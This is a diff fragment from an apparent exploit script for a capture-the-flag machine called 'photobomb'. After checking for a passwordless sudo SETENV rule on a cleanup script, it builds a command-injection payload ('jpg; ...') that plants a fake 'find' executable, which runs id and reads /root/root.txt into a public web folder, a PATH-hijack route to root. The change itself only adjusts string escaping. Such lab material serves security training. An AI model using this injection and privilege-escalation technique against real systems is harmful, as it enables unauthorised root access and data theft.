@@ -73,7 +73,7 @@ assert status == 200 and b"/opt/cleanup.sh" in sudo_rules and b"NOPASSWD" in sud
 print("PASS: wizard has the expected native sudo SETENV cleanup-script rule", flush=True)
 
 root_payload = (
-    "jpg; printf '%s\\\\n' '#!/bin/sh' "
+    "jpg; printf '%s\\n' '#!/bin/sh' "
     "'/usr/bin/id > /home/wizard/photobomb/public/ui_images/root-proof.txt' "
     "'/bin/cat /root/root.txt >> /home/wizard/photobomb/public/ui_images/root-proof.txt' "
     "> /home/wizard/photobomb/find; chmod 0755 /home/wizard/photobomb/find; "
